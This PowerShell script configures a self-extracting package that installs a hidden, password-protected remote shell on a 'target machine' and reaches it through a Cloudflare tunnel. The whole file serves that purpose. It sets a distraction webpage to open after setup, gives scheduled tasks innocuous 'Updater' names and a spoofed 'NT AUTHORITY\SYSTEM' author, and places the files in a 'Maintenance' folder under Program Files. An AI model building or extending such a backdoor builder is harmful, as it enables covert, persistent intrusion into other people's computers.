Set-Location -Path $PSScriptRoot
Remove-Item -ErrorAction Ignore ".\artifacts" -Recurse -Force
New-Item -ErrorAction Ignore -Path "." -Name "artifacts" -ItemType "directory" | Out-Null

$configParts = @(
    ("extraction-path", "Which folder should it be installed to on the target machine?", '%programfiles%\Maintenance', ("Service-manager.xml", "Service-vpn.xml", "sfx.cfg")),
    ("distraction-start", "Please enter a URL or file that should be started after setup", "https://support.microsoft.com/en-us/office/onedrive-release-notes-845dcf18-f921-435e-bf28-4e24b95e5fc0", ("setup.cmd")),

    ("shell-port", "Which port should the local shell run to? Make sure to choose one above 1024", "9215", ("Service-manager.xml", "Service-vpn.xml")),
    ("shell-auth", "Please enter a username and password, seperated by colons, for authentication to the shell", "username:password", ("Service-manager.xml")),

    ("task-author", "What should be the displayed author of the task?", "NT AUTHORITY\SYSTEM", ("Service-manager.xml", "Service-vpn.xml")),
    ("task-title-vpn", "What should be the name of the cloudflare task?", "UpdaterVPN", ("setup.cmd")),
    ("task-title-manager", "What should be the name of the shell task?", "UpdaterWindows", ("setup.cmd")),
    
    ("tunnel-uuid", "Please generate now a cloudflare tunnel and provide the UUID", "12345678-1234-1234-1234-123456789012", ("Service-vpn.xml", "setup.cmd")),
    ("tunnel-content", "Please copy the content of the newly created cloudflare tunnel JSON file", '{"AccountTag":"12345678901234567890123456789012","TunnelSecret":"12345678901234567890123456789012345678901234"}', ("setup.cmd"))
)

foreach ($configPart in $configParts) {
    $id = $configPart[0]
    if(("shell-auth", "tunnel-uuid", "tunnel-content").Contains($id)) {
        $label = "example:"
    } else {
        $label = "default:"
    }

    $prompt = $configPart[1]
    $default = $configPart[2]
    $input = Read-Host "$prompt ($label $default)"
    if($input -eq "") {
        if($label -eq "example:") {
            Write-Error "This field cannot remain empty, the displayed value is just an example! Exiting now..."
            exit
        }
        $input = $configPart[2]
        Write-Warning "Default used: $input"
    }
    
    foreach($filename in $configPart[3]) {
        $origPath = ".\template\$filename"
        $newPath = ".\artifacts\$filename"

        if (!(Test-Path $newPath)) {
            $content = Get-Content $origPath
        } else {
            $content = Get-Content $newPath
        }
        
        $content.replace("[$id]", $input) | Set-Content $newPath
    }
}
Write-Host "SUCCESS: All artifacts have been prepared - you can now continue building it!" -Foreground Green
Start-Sleep -Seconds 2